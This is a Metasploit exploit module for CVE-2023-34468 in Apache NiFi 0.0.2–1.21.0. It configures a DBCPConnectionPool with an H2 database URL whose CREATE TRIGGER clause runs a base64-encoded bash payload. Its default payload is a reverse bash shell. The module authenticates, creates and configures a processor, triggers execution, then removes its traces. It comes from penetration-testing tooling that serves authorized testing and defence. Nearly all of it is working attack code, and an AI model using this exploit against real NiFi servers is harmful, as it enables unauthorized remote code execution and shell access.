##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Nifi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache NiFi H2 Connection String Remote Code Execution',
        'Description' => %q{
          The DBCPConnectionPool and HikariCPConnectionPool Controller Services in
          Apache NiFi 0.0.2 through 1.21.0 allow an authenticated and authorized user
          to configure a Database URL with the H2 driver that enables custom code execution.

          This exploit will result in several shells (5-7).
          Successfully tested against Apache nifi 1.17.0 through 1.21.0.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Matei "Mal" Badanoiu' # discovery
        ],
        'References' => [
          ['CVE', '2023-34468'],
          ['URL', 'https://lists.apache.org/thread/7b82l4f5blmpkfcynf3y6z4x1vqo59h8'],
          ['URL', 'https://issues.apache.org/jira/browse/NIFI-11653'],
          ['URL', 'https://nifi.apache.org/security.html#1.22.0'],
          # not many h2 references on the Internet, especially for nifi, so leaving this here
          # ['URL', 'https://gist.github.com/ijokarumawak/ed9085024eeeefbca19cfb2f20d23ed4#file-table_record_change_detection_example-xml-L65']
          # ['URL', 'http://www.h2database.com/html/features.html']
        ],
        'DisclosureDate' => '2023-06-12',
        'DefaultOptions' => { 'RPORT' => 8443 },
        'Platform' => %w[unix],
        'Arch' => [ARCH_CMD],
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Type' => :unix_memory,
              'Payload' => { 'BadChars' => '"' },
              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }
            }
          ],
        ],
        'Privileged' => false,
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/']),
        OptInt.new('DELAY', [true, 'The delay (s) before stopping and deleting the processor', 30])
      ],
      self.class
    )
  end

  def configure_dbconpool
    # our base64ed payload can't have = in it, so we'll pad out with spaces to remove them
    b64_pe = ::Base64.strict_encode64(payload.encoded)
    equals_count = b64_pe.count('=')
    if equals_count > 0
      b64_pe = ::Base64.strict_encode64(payload.encoded + ' ' * equals_count)
    end

    if @version > Rex::Version.new('1.16.0')
      # 1.17.0-1.21.0
      driver = '/opt/nifi/nifi-toolkit-current/lib/h2-2.1.214.jar'
    else
      # 1.16.0
      driver = '/opt/nifi/nifi-toolkit-current/lib/h2-2.1.210.jar'
    end

    body = {
      'disconnectedNodeAcknowledged' => false,
      'component' => {
        'id' => @db_con_pool,
        'name' => @db_con_pool_name,
        'bulletinLevel' => 'WARN',
        'comments' => '',
        'properties' => {
          # https://github.com/apache/nifi/pull/7349/files#diff-66ccc94a6b0dfa29817ded9c18e5a87c4fff9cd38eeedc3f121f6436ba53e6c0R38
          # we can use a random db name here, the file is created automatically
          # XXX would mem work too?
          'Database Connection URL' => "jdbc:h2:file:/tmp/#{Rex::Text.rand_text_alphanumeric(6..10)}.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER #{Rex::Text.rand_text_alpha_upper(6..12)} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,#{b64_pe}}|{base64,-d}|{bash,-i}')\n$$--=x",
          'Database Driver Class Name' => 'org.h2.Driver',
          # This seems to be installed by default, do we need the location?
          'database-driver-locations' => driver,
          "Max Total Connections": '1' # prevents us from getting multiple callbacks
        },
        'sensitiveDynamicPropertyNames' => []
      },
      'revision' => {
        'clientId' => 'x',
        'version' => 0
      }
    }
    opts = {
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'controller-services', @db_con_pool),
      'ctype' => 'application/json',
      'data' => body.to_json
    }
    opts['headers'] = { 'Authorization' => "Bearer #{@token}" } if @token
    res = send_request_cgi(opts)
    fail_with(Failure::Unreachable, 'No response received') if res.nil?
    fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code received #{res.code}") unless res.code == 200
  end

  def configure_processor
    vprint_status("Configuring processor #{@processor}")
    body = {
      # "disconnectedNodeAcknowledged"=> false,
      'component' => {
        'id' => @processor,
        'name' => Rex::Text.rand_text_alphanumeric(6..10),
        'bulletinLevel' => 'WARN',
        'comments' => '',
        'config' => {
          'autoTerminatedRelationships' => ['failure', 'success'],
          'bulletinLevel' => 'WARN',
          'comments' => '',
          'concurrentlySchedulableTaskCount' => '1',
          'executionNode' => 'ALL',
          'penaltyDuration' => '30 sec',
          'retriedRelationships' => [],
          'schedulingPeriod' => '0 sec',
          'schedulingStrategy' => 'TIMER_DRIVEN',
          'yieldDuration' => '1 sec',
          'state' => 'STOPPED',
          'properties' => {
            'Database Connection Pooling Service' => @db_con_pool,
            'SQL select query' => 'SELECT H2VERSION() FROM DUAL;' # innocious get version query, field required to be non-blank
          }
        }
      },
      'revision' => {
        'clientId' => 'x',
        'version' => 1 # needs to be 1 since we had 0 before
      }
    }
    opts = {
      'method' => 'PUT',
      'uri' => normalize_uri(target_uri.path, 'nifi-api', 'processors', @processor),
      'ctype' => 'application/json',
      'data' => body.to_json
    }
    opts['headers'] = { 'Authorization' => "Bearer #{@token}" } if @token
    res = send_request_cgi(opts)
    fail_with(Failure::Unreachable, 'No response received') if res.nil?
    fail_with(Failure::UnexpectedReply, "Unexpected HTTP response code received #{res.code}") unless res.code == 200
  end

  def check
    # see apache_nifi_processor_rce check method for details on why this is difficult

    @cleanup_required = false

    login_type = supports_login?

    return CheckCode::Unknown('Unable to determine if logins are supported') if login_type.nil?

    if login_type
      @version = get_version
      return CheckCode::Unknown('Unable to determine Apache NiFi version') if @version.nil?

      if @version <= Rex::Version.new('1.21.0')
        return CheckCode::Appears("Apache NiFi instance supports logins and vulnerable version detected: #{@version}")
      end

      CheckCode::Safe("Apache NiFi instance supports logins but non-vulnerable version detected: #{@version}")
    else
      CheckCode::Appears('Apache NiFi instance does not support logins')
    end
  end

  def validate_config
    if datastore['BEARER-TOKEN'].to_s.empty? && datastore['USERNAME'].to_s.empty?
      fail_with(Failure::BadConfig,
                'Authentication is required. Bearer-Token or Username and Password must be specified')
    end
  end

  def cleanup
    super
    return unless @cleanup_required

    # Wait for thread to execute - This seems necesarry, especially on Windows
    # and there is no way I can see of checking whether the thread has executed
    print_status("Waiting #{datastore['DELAY']} seconds before stopping and deleting")
    sleep(datastore['DELAY'])

    # Stop Processor
    stop_processor(@token, @processor)
    vprint_good("Stopped and terminated processor #{@processor}")

    # Delete processor
    delete_processor(@token, @processor, 3)
    vprint_good("Deleted processor #{@processor}")
    begin
      stop_dbconnectionpool(@token, @db_con_pool)
    rescue DBConnectionPoolError
      fail_with(Failure::UnexpectedReply, 'Unable to stop DB Connection Pool. Manual cleanup is required')
    end
    vprint_good("Disabled db connection pool #{@db_con_pool}, sleeping #{datastore['DELAY']} seconds to allow the connection to finish disabling")
    sleep(datastore['DELAY'])
    begin
      delete_dbconnectionpool(@token, @db_con_pool)
    rescue DBConnectionPoolError
      fail_with(Failure::UnexpectedReply, 'Unable to delete DB Connection Pool. Manual cleanup is required')
    end
    vprint_good("Deleted db connection pool #{@db_con_pool}")
  end

  def exploit
    # Check whether login is required and set/fetch token
    if supports_login?
      validate_config
      @token = if datastore['BEARER-TOKEN'].to_s.empty?
                 retrieve_login_token
               else
                 datastore['BEARER-TOKEN']
               end
      fail_with(Failure::NoAccess, 'Invalid Credentials') if @token.nil?
    else
      @token = nil
    end

    if @version.nil?
      @version = get_version
    end

    # Retrieve root process group
    @process_group = fetch_root_process_group(@token)
    fail_with(Failure::UnexpectedReply, 'Unable to retrieve root process group') if @process_group.nil?
    vprint_good("Retrieved process group: #{@process_group}")

    @db_con_pool_name = Rex::Text.rand_text_alphanumeric(6..10)
    begin
      @db_con_pool = create_dbconnectionpool(@token, @db_con_pool_name, @process_group, @version)
    rescue DBConnectionPoolError
      fail_with(Failure::UnexpectedReply,
                'Unable to create DB Connection Pool. Manual review of HTTP packets will be required to debug failure.')
    end

    @cleanup_required = true

    # Create processor in root process group
    @processor = create_processor(@token, @process_group, 'org.apache.nifi.processors.standard.ExecuteSQL')
    vprint_good("Created processor #{@processor} in process group #{@process_group}")
    configure_processor
    vprint_good("Configured processor #{@processor}")
    configure_dbconpool
    vprint_good("Configured db connection pool #{@db_con_pool_name} (#{@db_con_pool})")
    begin
      start_dbconnectionpool(@token, @db_con_pool)
    rescue DBConnectionPoolError
      fail_with(Failure::UnexpectedReply,
                'Unable to start DB Connection Pool. Manual review of HTTP packets will be required to debug failure.')
    end
    vprint_good('Enabled db connection pool')
    begin
      start_processor(@token, @processor)
    rescue ProcessorError
      fail_with(Failure::UnexpectedReply,
                'Unable to start Processor. Manual review of HTTP packets will be required to debug failure.')
    end

    vprint_good('Started processor')
  end
end
